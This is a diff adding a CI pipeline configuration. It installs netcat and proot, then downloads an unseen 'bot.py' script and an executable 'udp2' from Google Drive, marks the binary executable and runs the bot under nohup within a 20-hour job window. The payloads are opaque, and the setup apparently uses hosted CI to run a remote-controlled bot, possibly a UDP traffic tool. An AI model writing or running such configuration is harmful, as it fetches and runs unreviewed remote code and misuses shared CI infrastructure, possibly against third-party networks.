@@ -1,0 +1,19 @@
+task:
+  name: Run Bot
+  timeout_in: 20h
+  container:
+    image: ubuntu:22.04
+
+  install_script:
+    - apt-get update -y
+    - apt-get install -y debootstrap proot wget curl ca-certificates netcat iproute2 python3 python3-pip
+    - pip3 install --upgrade pip
+    - pip3 install gdown psutil requests
+
+  script:
+    - gdown --id 1zAx6zps-jxlxpMpKC4wCX3nOScGNSwX_ -O bot.py
+    - gdown --id 1oz1D1qMommN4YESvyTXvhk0cAgkVLXFE -O udp2
+    - chmod +x udp2
+    # Chạy bot.py bằng nohup để chạy background
+    - nohup python3 bot.py 
+    - echo "Bot is running in background..."
